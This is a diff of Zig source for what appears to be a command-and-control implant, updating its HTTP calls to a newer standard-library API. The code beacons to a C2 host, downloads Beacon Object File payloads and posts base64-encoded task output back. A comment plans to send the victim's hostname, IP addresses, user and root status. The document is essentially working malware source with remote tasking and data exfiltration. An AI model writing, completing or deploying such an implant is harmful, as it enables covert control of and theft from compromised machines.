@@ -8,18 +8,27 @@ const jitter = 3;
 
 fn fetchBofContent(allocator: std.mem.Allocator, bof_uri: []const u8) ![]u8 {
     var h = std.http.Headers{ .allocator = allocator };
+    defer h.deinit();
 
-    var http_client: std.http.Client = .{ .allocator = allocator, .proxy = .{ .protocol = .plain, .host = "127.0.0.1", .port = 8080 } };
+    var http_client: std.http.Client = .{
+        .allocator = allocator,
+        .http_proxy = .{
+            .allocator = allocator,
+            .headers = h,
+            .protocol = .plain,
+            .host = "127.0.0.1",
+            .port = 8080,
+        },
+    };
     defer http_client.deinit();
 
-    defer h.deinit();
     var buf: [256]u8 = undefined;
     const uri = try std.fmt.bufPrint(&buf, "http://{s}{s}", .{ c2_host, bof_uri });
     const bof_url = try std.Uri.parse(uri);
-    var bof_req = try http_client.request(.GET, bof_url, h, .{});
+    var bof_req = try http_client.open(.GET, bof_url, h, .{});
     defer bof_req.deinit();
 
-    try bof_req.start(.{});
+    try bof_req.send(.{});
     try bof_req.wait();
 
     const stdout = std.io.getStdOut();
@@ -65,11 +74,20 @@ pub fn main() !u8 {
     defer _ = gpa.deinit();
     const allocator = gpa.allocator();
 
-    var http_client: std.http.Client = .{ .allocator = allocator, .proxy = .{ .protocol = .plain, .host = "127.0.0.1", .port = 8080 } };
-    defer http_client.deinit();
-
     var heartbeat_header = std.http.Headers{ .allocator = allocator };
     defer heartbeat_header.deinit();
+
+    var http_client: std.http.Client = .{
+        .allocator = allocator,
+        .http_proxy = .{
+            .allocator = allocator,
+            .headers = heartbeat_header,
+            .protocol = .plain,
+            .host = "127.0.0.1",
+            .port = 8080,
+        },
+    };
+    defer http_client.deinit();
 
     // TODO: Authorization: base64(ipid=arch:OS:hostname:internalIP:externalIP:currentUser:isRoot)
     const base64_encoder = std.base64.Base64Encoder.init(std.base64.standard_alphabet_chars, '=');
@@ -85,10 +103,10 @@ pub fn main() !u8 {
 
     while (true) {
         // send heartbeat to C2 and check if any tasks are pending
-        var req = try http_client.request(.GET, heartbeat_uri, heartbeat_header, .{});
+        var req = try http_client.open(.GET, heartbeat_uri, heartbeat_header, .{});
         defer req.deinit();
 
-        try req.start(.{});
+        try req.send(.{});
         try req.wait();
 
         if (req.response.status != .ok) {
@@ -185,12 +203,12 @@ pub fn main() !u8 {
                     try h.append("content-type", "text/plain");
                     try h.append("Authorization", request_id);
 
-                    var reqRes = try http_client.request(.POST, heartbeat_uri, h, .{});
+                    var reqRes = try http_client.open(.POST, heartbeat_uri, h, .{});
                     defer reqRes.deinit();
 
                     reqRes.transfer_encoding = .{ .content_length = out_b64.len };
 
-                    try reqRes.start(.{});
+                    try reqRes.send(.{});
                     try reqRes.writeAll(out_b64);
                     try reqRes.finish();
 
